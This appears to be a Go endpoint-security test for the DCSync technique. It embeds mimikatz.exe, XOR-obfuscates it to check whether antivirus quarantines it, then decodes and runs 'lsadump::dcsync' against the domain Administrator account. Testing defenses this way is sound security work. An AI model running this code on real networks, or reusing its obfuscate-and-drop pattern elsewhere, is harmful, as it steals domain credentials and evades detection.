//go:build windows
// +build windows

/*
ID: 21545977-2b92-4788-a9b8-f5697f34b378
NAME: DCSync
TECHNIQUE: T1003.006
UNIT: response
CREATED: 2023-11-08 19:01:37.069895
*/
package main

import (
	_ "embed"

	Dropper "github.com/preludeorg/libraries/go/tests/dropper"
	Endpoint "github.com/preludeorg/libraries/go/tests/endpoint"
)

//go:embed mimikatz.exe
var malicious []byte

func ADJoined() bool {
	Endpoint.Say("Checking if endpoint is connected to Active Directory")
	command := []string{"powershell.exe", "-c", "[System.DirectoryServices.ActiveDirectory.Domain]::GetComputerDomain()"}
	_, err := Endpoint.Shell(command)
	if err != nil {
		Endpoint.Say("Endpoint not connected to Active Directory")
		return false
	}
	return true
}

func dcsync() error {
	var command = []string{"cmd.exe", "/c", ".\\mimikatz.exe", `lsadump::dcsync /user:Administrator`, "exit"}
	_, err := Endpoint.Shell(command)
	return err
}

func test() {
	if !ADJoined() {
		Endpoint.Stop(104)
	}
	if err := Endpoint.Dropper(Dropper.Dropper); err != nil {
		Endpoint.Say("%v", err)
		Endpoint.Stop(Endpoint.UnexpectedTestError)
	}
	Endpoint.Say("Performing xor obfuscation on file")
	maliciousXORed, key, _ := Endpoint.XorEncrypt(malicious)
	Endpoint.Say("Extracting file for quarantine test")
	Endpoint.Say("Pausing for 3 seconds to gauge defensive reaction")
	if Endpoint.Quarantined("mimikatzXOR.exe", maliciousXORed) {
		Endpoint.Say("Malicious file was caught!")
		Endpoint.Stop(105)
	}

	Endpoint.Say("Malicious file was not caught, continuing VST execution")

	if err := Endpoint.Dropper(Dropper.Dropper); err != nil {
		Endpoint.Say("%v", err)
		Endpoint.Stop(Endpoint.UnexpectedTestError)
	}

	Endpoint.Say("Performing xor deobfuscation on file")
	maliciousDecoded := Endpoint.XorDecrypt(maliciousXORed, key)
	filename := "mimikatz.exe"
	Endpoint.Write(filename, maliciousDecoded)
	Endpoint.Say("Executing DCSync")
	err := dcsync()
	if err != nil {
		Endpoint.Say("Execution was prevented")
		Endpoint.Stop(126)
	}

	Endpoint.Say("Mimikatz was not blocked")
	Endpoint.Stop(101)
}

func main() {
	Endpoint.Start(test)
}
